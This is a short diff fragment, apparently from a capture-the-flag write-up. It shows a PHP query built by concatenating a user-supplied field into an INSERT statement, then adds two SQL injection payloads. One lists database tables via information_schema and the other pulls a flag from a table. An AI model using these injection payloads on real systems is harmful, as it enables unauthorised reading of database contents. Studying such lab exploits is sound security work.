@@ -24,4 +24,7 @@ dpt_name=aa&dpt_address=aa&dpt_build_year=2021-04-02&dpt_has_cert=on&dpt_cert_nu
 ```
 $dpt_name="(select database())";
 $sql="insert into user set name='".$dpt_name."';";
+
+dpt_name=1',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())#
+dpt_name=1',sds_address=(select flag from sds_fl9g)#
 ```
